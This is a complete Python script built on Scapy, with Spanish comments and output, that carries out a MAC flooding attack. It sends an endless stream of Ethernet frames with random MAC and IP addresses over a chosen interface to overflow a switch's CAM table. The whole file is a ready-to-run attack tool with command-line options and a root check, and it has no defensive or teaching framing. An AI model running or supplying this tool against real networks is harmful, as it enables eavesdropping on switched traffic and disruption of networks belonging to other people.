#!/usr/bin/env python3

from scapy.all import *
import random, time, os, sys, argparse

def random_mac():
    """Genera una MAC aleatoria."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

def build_frame(src_mac, dst_mac):
    """Construye un frame Ethernet con MACs falsas."""
    return (
        Ether(src=src_mac, dst=dst_mac) /
        IP(src="10.11.85.%d" % random.randint(1,254),
           dst="10.11.85.%d" % random.randint(1,254)) /
        UDP(sport=random.randint(1024,65535),
            dport=random.randint(1024,65535)) /
        Raw(b"X" * 18)
    )

def mac_flooding(iface, count, delay, verbose):
    print(f"\n{'='*55}")
    print(f"  MAC Flooding Attack")
    print(f"  Interfaz : {iface}")
    print(f"  Paquetes : {'Infinito' if count == 0 else count}")
    print(f"{'='*55}\n")
    print("[*] Inundando tabla CAM del switch...")
    print("[*] Ctrl+C para detener\n")

    sent  = 0
    start = time.time()

    try:
        while True:
            if count != 0 and sent >= count:
                break

            src_mac = random_mac()
            dst_mac = random_mac()
            pkt     = build_frame(src_mac, dst_mac)

            try:
                sendp(pkt, iface=iface, verbose=False)
                sent += 1

                if verbose or sent % 500 == 0:
                    elapsed = time.time() - start
                    pps     = sent / elapsed if elapsed > 0 else 0
                    print(f"[+] Enviados: {sent:>7} | {pps:>8.0f} pkt/s | "
                          f"MAC: {src_mac}")

                if delay > 0:
                    time.sleep(delay)

            except Exception as e:
                print(f"[!] Error: {e}")
                continue

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    print(f"\n{'='*55}")
    print(f"  Total    : {sent} frames enviados")
    print(f"  Tiempo   : {elapsed:.1f}s")
    print(f"  Promedio : {sent/elapsed:.0f} pkt/s")
    print(f"{'='*55}\n")

def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta con sudo")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="MAC Flooding Attack")
    parser.add_argument("-i", "--iface",   default="eth0",  help="Interfaz (default: eth0)")
    parser.add_argument("-c", "--count",   type=int, default=0, help="Num frames (0=infinito)")
    parser.add_argument("-d", "--delay",   type=float, default=0.0, help="Delay entre frames")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar cada frame")
    args = parser.parse_args()

    mac_flooding(args.iface, args.count, args.delay, args.verbose)

if __name__ == "__main__":
    main()
